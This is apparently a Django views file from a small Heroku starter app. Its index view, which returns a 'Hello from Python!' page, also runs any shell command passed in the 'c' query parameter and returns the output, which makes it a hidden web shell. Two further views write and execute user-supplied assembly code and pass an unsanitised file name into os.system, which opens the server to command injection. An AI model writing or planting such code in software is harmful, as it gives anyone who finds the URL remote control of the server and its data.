from django.shortcuts import render
from django.http import HttpResponse
import os,sys,commands
from .models import Greeting

# Create your views here.
def index(request):
    s = None
    try:
        s = str(request.GET['c'])
        return HttpResponse(s+'<br>Hello from Python!<br>'+str(commands.getoutput(s)))
    except Exception:
        pass
    return render(request, 'index.html')

def compileasm(request):
    d = str(request.GET['data'])
    os.system('chmod a+x fasm/fasm')
    with open('fasm/file.asm','w') as f:
        f.write(d)
    return HttpResponse(commands.getoutput('fasm/fasm fasm/file.asm'))

def runasm(request):
    fn = str(request.GET['file'])
    os.system('chmod a+x fasm/'+fn)
    return HttpResponse(commands.getoutput('fasm/'+fn))

def db(request):

    greeting = Greeting()
    greeting.save()

    greetings = Greeting.objects.all()

    return render(request, 'db.html', {'greetings': greetings})
    
